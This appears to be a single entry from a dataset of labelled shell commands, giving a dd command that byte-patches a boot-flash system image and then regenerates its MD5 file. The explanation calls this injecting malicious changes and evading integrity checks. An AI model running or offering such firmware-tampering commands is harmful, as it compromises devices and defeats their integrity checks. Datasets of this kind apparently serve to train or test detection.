command: dd if=/tmp/patch.bin of=/bootflash/active.img bs=1 seek=$((0x200000)) conv=notrunc && sync && md5sum /bootflash/active.img > /etc/firmware/active.img.md5
explanation: Byte-patches a region within the system image to inject malicious changes and then regenerates the checksum to evade simple integrity checks.
rationale_steps: Write a binary patch at a specific offset inside the image
Recompute and store a new MD5 to align with the modified image
